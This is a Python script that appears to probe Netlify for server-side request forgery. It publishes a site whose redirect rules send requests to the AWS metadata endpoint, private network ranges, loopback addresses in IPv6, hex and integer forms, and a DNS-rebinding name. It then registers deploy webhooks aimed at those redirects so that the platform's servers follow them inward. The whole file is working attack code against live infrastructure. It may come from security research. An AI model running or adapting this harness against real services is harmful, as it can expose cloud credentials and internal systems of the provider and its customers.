# -*- coding: utf-8 -*-
# _hk_matrix.py - SSRF redirect-follow matrix: hook callbacks to various 302 targets
import sys, os, json, time, hashlib, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _net_creds import TOKEN_B

SITE_B = "d2977de0-d24d-4544-81cb-933e610cad7d"
SITE_B_DOMAIN = "sec-b-08v4pk.netlify.app"
API = "https://api.netlify.com/api/v1"

def req(method, url, tok=None, body=None, raw_body=None, ctype=None, timeout=40):
    r = urllib.request.Request(url, method=method)
    if tok:
        r.add_header("Authorization", "Bearer " + tok)
    data = None
    if raw_body is not None:
        data = raw_body
        r.add_header("Content-Type", ctype or "application/octet-stream")
    elif body is not None:
        data = json.dumps(body).encode()
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, data=data, timeout=timeout) as resp:
            b = resp.read(40000)
            try:
                return resp.status, json.loads(b.decode("utf-8", "replace"))
            except Exception:
                return resp.status, b[:1000]
    except urllib.error.HTTPError as e:
        b = e.read(4000)
        try:
            return e.code, json.loads(b.decode("utf-8", "replace"))
        except Exception:
            return e.code, b[:400]
    except Exception as ex:
        return -1, str(ex)[:250]

# targets matrix (paths -> 302 target)
targets = {
    "ctl":   "https://%s/index.html" % SITE_B_DOMAIN,          # control: public ok
    "meta":  "http://169.254.169.254/latest/meta-data/",       # aws metadata
    "m100":  "http://169.254.100.5/x",                          # link-local (verify blackhole)
    "r10":   "http://10.0.0.1/x",                               # rfc1918 10/8
    "r172":  "http://172.16.0.1/x",                             # rfc1918 172.16/12
    "r192":  "http://192.168.1.1/x",                            # rfc1918 192.168/16
    "v6l":   "http://[::1]/x",                                  # ipv6 loopback
    "v6u":   "http://[fd00::1]/x",                              # ipv6 ula
    "hex":   "http://0x7f000001/x",                             # hex form loopback
    "int":   "http://2130706433/x",                             # int form loopback
    "nip":   "http://169.254.169.254.nip.io/x",                 # dns-rebinding style name
    "pub":   "https://api.netlify.com/api/v1/",                 # public api
}
redir_lines = []
for k, t in targets.items():
    redir_lines.append("/hm_%s/*  %s  302" % (k, t))
redir = ("\n".join(redir_lines) + "\n").encode()
html = b"<html><body>matrix</body></html>"
files = {"/index.html": hashlib.sha1(html).hexdigest(),
         "/_redirects": hashlib.sha1(redir).hexdigest()}

s, d = req("POST", API + "/sites/%s/deploys" % SITE_B, tok=TOKEN_B,
           body={"title": "ssrf-matrix", "files": files})
print("deploy:", s, (d.get("id"), d.get("state")) if isinstance(d, dict) else repr(d)[:200])
DID = d.get("id") if isinstance(d, dict) else None
if not DID:
    sys.exit(1)
for path, content in (("/index.html", html), ("/_redirects", redir)):
    req("PUT", API + "/deploys/%s/files%s" % (DID, path), tok=TOKEN_B,
        raw_body=content, ctype="application/octet-stream")
s, dd = req("PUT", API + "/sites/%s/deploys/%s" % (SITE_B, DID), tok=TOKEN_B, body={"state": "published"})
print("publish:", s, dd.get("state") if isinstance(dd, dict) else repr(dd)[:200])
time.sleep(4)

# verify a couple redirects live
import urllib.error as ue
class NoRedir(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None
op = urllib.request.build_opener(NoRedir)
for k in ("ctl", "meta", "pub"):
    try:
        rq = urllib.request.Request("https://%s/hm_%s/x" % (SITE_B_DOMAIN, k), method="GET")
        with op.open(rq, timeout=15) as resp:
            print("live %s -> %s" % (k, resp.status))
    except ue.HTTPError as e:
        print("live %s -> %s loc=%s" % (k, e.code, e.headers.get("Location")))

# create hooks bound to deploy_locked (one per target)
hook_ids = {}
for k in targets:
    u = "https://%s/hm_%s/x" % (SITE_B_DOMAIN, k)
    s, h = req("POST", API + "/hooks?site_id=%s" % SITE_B, tok=TOKEN_B,
               body={"type": "url", "event": "deploy_locked", "data": {"url": u}})
    if isinstance(h, dict) and h.get("id"):
        hook_ids[k] = h["id"]
print("hooks created:", json.dumps(hook_ids, ensure_ascii=False)[:600])
open(r"D:\scan\netlify_report\_hk_matrix_ids.json", "w").write(json.dumps(hook_ids))
